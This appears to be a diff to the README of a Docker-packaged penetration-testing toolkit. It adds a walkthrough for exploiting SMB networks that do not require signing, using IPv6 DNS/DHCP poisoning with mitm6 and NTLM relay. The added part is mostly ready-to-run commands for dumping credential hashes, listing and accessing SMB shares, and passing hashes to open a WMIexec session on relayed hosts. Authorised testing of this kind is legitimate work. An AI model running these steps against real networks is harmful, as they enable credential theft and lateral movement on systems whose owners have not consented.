@@ -105,6 +105,12 @@ check_if_smb_is_required target_ip_address_or_list_of_ips
 
 ### Exploit SMB signing not required via DNS6 poisoning and NTLM relay.
 
+If Ipv6 is not being actively managed by a DNS and DHCP server and IPv6 packets are flowing then we can likely
+compromise this network by setting up a DNS server and DHCP server for IPv6. It is worth noting that according to [RFC3484](https://www.ietf.org/rfc/rfc3484.txt)
+
+IPv6 will be preferred over IPv4 which means that once IPv6 is being managed, nodes on the network will send packets via IPv6 as
+opposed to IPV4.
+
 ```bash
 screen -S mitm6 -d -m  docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
 start_mitm6 local_network_interface target_domain_name
@@ -125,6 +131,40 @@ You can interact with the above screen with the command:
 ```
 screen -r ipv6_relay
 ```
+
+You can check if SMB sessions have been created successfully by resuming the `relay_ipv6`
+screen and running the `socks` command
+
+If SMB sessions have been created, you can perform a number of actions going forward using proxychains:
+
+
+- Dumping hashes
+
+The domain/account used in the command below can be retrieved by resuming the `relay_ipv6` screen (see above) and
+running the `socks` command
+
+    ```bash
+    docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest dump_creds DOMAIN/Account@x.x.x.x
+    ```
+
+- List SMB shares
+
+```bash
+    docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest list_smb_shares ip_address_of_target DOMAIN\\Account
+```
+
+- Accessing SMB shares
+
+```bash
+    docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest access_smb  \\\\ip_address_of_target DOMAIN\\Account
+```
+- Passing hashes for a WMIexec session
+
+```bash
+
+docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest pass_hashes_wmi_exec hashes user@x.x.x.x
+```
+
 
 ### Exploit SMB signing not required via DNS poisoning and NTLM relay.
 
